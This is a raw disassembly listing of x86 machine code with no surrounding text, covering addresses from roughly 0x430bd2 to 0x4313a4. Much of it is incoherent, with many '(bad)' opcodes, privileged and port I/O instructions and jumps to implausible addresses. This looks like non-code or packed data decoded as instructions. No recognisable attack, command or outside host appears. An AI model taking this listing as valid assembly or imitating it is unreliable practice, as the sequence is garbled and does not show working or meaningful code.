  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
